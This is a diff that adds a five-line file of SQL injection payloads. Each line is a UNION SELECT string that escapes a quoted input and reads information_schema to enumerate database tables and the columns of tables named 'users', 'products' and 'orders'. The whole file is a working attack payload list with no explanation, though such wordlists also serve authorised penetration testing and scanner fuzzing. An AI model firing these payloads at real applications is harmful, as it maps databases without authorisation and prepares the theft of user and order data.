@@ -1,0 +1,5 @@
+' UNION SELECT table_name,table_type,table_catalog FROM information_schema.tables --
+' UNION SELECT column_name,data_type,character_maximum_length FROM information_schema.columns --
+' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='products' --
+' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='orders' --
